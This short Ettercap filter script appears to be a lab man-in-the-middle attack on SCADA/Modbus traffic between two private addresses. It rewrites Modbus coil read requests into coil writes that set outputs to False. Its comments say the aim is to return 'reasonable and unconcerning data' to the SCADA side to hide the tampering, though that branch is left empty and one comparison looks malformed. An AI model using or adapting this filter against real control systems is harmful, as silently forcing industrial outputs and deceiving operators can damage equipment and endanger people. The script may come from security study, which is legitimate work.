# Help from https://github.com/Ettercap/ettercap/blob/master/share/etter.filter.examples

# Needs:
# -  Check the source and destination of the packet
#    -  If coming from SCADA and going to Server-2, mangle
#    -  If coming from Server-2 and going to SCADA, send reasonable and unconcerning data
#    -  Else, don't sweat it


#Run the filter; target IPs must be manually entered in code
if (ip.proto == TCP) {
    # Packet is coming from SCADA and going to Server-2
    if (ip.src == '192.168.56.105' && ip.dst == '192.168.56.106'){
        if (DATA.data + 12 == "\x01\x00\x00\x00\x0a"){
            msg("Qualifies for mangling.");
        }
        if (search(DATA.data,"\x00\x06\x00\x01\x00\x00\x00\x08")){
            # Replace read request with write coils to False
            replace("\x00\x06\x00\x01\x00\x00\x00\x08","\x00\x07\x00\x0f\x00\x00\x00\x00\x00");            

            msg("Found coil read, replaced with coil write to False.");
        }
    }

    # Packet is coming from Server-2 and going to SCADA
    if (ip.src == '192.168.56.106' && ip.dst == '192.168.56.105') {
        msg("Qualifies for falsification.");
        
        #Force valid response packet to client
        
    }
}